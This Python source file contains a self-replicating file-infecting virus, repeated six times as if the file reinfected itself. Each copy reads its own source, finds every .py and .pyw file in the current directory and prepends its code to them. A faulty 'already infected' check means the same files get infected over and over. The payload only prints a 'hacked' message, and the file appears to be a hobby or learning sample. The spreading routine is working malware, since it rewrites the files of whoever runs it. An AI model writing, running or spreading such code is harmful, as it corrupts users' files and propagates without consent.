#say hi
import sys
import glob

the_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
# print(lines)

self_replicating_part = False

if lines[0] == "#say hi\n":
    self_replicating_part=True

for line in lines:
    if line == "#say hi\n":
        self_replicating_part =True
    if not self_replicating_part:
        the_code.append(line)
    if line == "#go bye\n":
        break

the_code = lines

print(the_code)

python_files = glob.glob('*.py') + glob.glob('*.pyw')

print(python_files)

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    
    infected = False

    for line in file_code:
        if line == "#say hi":
            infected = True
            print("infected")
            break
    
    if not infected:
        print("in ", file)
        final_code = []
        print(the_code)
        final_code.extend(the_code)
        # final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def mal_code():
    print("hey maybe thou art hacked!")

mal_code()
#go bye
#say hi
import sys
import glob

the_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
# print(lines)

self_replicating_part = False

if lines[0] == "#say hi\n":
    self_replicating_part=True

for line in lines:
    if line == "#say hi\n":
        self_replicating_part =True
    if not self_replicating_part:
        the_code.append(line)
    if line == "#go bye\n":
        break

the_code = lines

print(the_code)

python_files = glob.glob('*.py') + glob.glob('*.pyw')

print(python_files)

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    
    infected = False

    for line in file_code:
        if line == "#say hi":
            infected = True
            print("infected")
            break
    
    if not infected:
        print("in ", file)
        final_code = []
        print(the_code)
        final_code.extend(the_code)
        # final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def mal_code():
    print("hey maybe thou art hacked!")

mal_code()
#go bye
#say hi
import sys
import glob

the_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
# print(lines)

self_replicating_part = False

if lines[0] == "#say hi\n":
    self_replicating_part=True

for line in lines:
    if line == "#say hi\n":
        self_replicating_part =True
    if not self_replicating_part:
        the_code.append(line)
    if line == "#go bye\n":
        break

the_code = lines

print(the_code)

python_files = glob.glob('*.py') + glob.glob('*.pyw')

print(python_files)

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    
    infected = False

    for line in file_code:
        if line == "#say hi":
            infected = True
            print("infected")
            break
    
    if not infected:
        print("in ", file)
        final_code = []
        print(the_code)
        final_code.extend(the_code)
        # final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def mal_code():
    print("hey maybe thou art hacked!")

mal_code()
#go bye
#say hi
import sys
import glob

the_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
# print(lines)

self_replicating_part = False

if lines[0] == "#say hi\n":
    self_replicating_part=True

for line in lines:
    if line == "#say hi\n":
        self_replicating_part =True
    if not self_replicating_part:
        the_code.append(line)
    if line == "#go bye\n":
        break

the_code = lines

print(the_code)

python_files = glob.glob('*.py') + glob.glob('*.pyw')

print(python_files)

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    
    infected = False

    for line in file_code:
        if line == "#say hi":
            infected = True
            print("infected")
            break
    
    if not infected:
        print("in ", file)
        final_code = []
        print(the_code)
        final_code.extend(the_code)
        # final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def mal_code():
    print("hey maybe thou art hacked!")

mal_code()
#go bye
#say hi
import sys
import glob

the_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
# print(lines)

self_replicating_part = False

if lines[0] == "#say hi\n":
    self_replicating_part=True

for line in lines:
    if line == "#say hi\n":
        self_replicating_part =True
    if not self_replicating_part:
        the_code.append(line)
    if line == "#go bye\n":
        break

the_code = lines

print(the_code)

python_files = glob.glob('*.py') + glob.glob('*.pyw')

print(python_files)

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    
    infected = False

    for line in file_code:
        if line == "#say hi":
            infected = True
            print("infected")
            break
    
    if not infected:
        print("in ", file)
        final_code = []
        print(the_code)
        final_code.extend(the_code)
        # final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def mal_code():
    print("hey maybe thou art hacked!")

mal_code()
#go bye
#say hi
import sys
import glob

the_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
# print(lines)

self_replicating_part = False

if lines[0] == "#say hi\n":
    self_replicating_part=True

for line in lines:
    if line == "#say hi\n":
        self_replicating_part =True
    if not self_replicating_part:
        the_code.append(line)
    if line == "#go bye\n":
        break

the_code = lines

print(the_code)

python_files = glob.glob('*.py') + glob.glob('*.pyw')

print(python_files)

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    
    infected = False

    for line in file_code:
        if line == "#say hi":
            infected = True
            print("infected")
            break
    
    if not infected:
        print("in ", file)
        final_code = []
        print(the_code)
        final_code.extend(the_code)
        # final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def mal_code():
    print("hey maybe thou art hacked!")

mal_code()
#go bye
